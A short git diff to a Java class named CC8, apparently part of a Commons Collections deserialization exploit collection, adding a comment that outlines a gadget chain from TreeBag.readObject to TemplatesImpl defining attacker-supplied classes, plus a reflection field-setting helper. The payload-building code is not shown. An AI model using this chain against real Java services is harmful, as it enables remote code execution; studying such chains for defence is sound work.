@@ -18,6 +18,20 @@ import java.io.ObjectOutputStream;
 import java.lang.reflect.Field;
 import java.util.Base64;
 
+/*
+* TreeBag.readObject()
+*  ->AbstractMapBag.doReadObject()
+*   ->TreeMap.put()
+*    ->TransformingComparator.compare()
+*     ->ChainTransformer.transform()
+*      ->InstantiateTransformer.transform()
+*       ->TrAXFilter.TrAXFilter()
+*        ->TemplatesImpl.newTransformer()
+*         ->TemplatesImpl.getTransletInstance()
+*          ->TemplatesImpl.defineTransletClasses()
+*           ->TemplatesImpl$TransletClassLoader.defineClass()
+* */
+
 public class CC8 {
     public static void setFieldValue(Object obj, String fieldName, Object value) throws Exception {
         Field field = obj.getClass().getDeclaredField(fieldName);
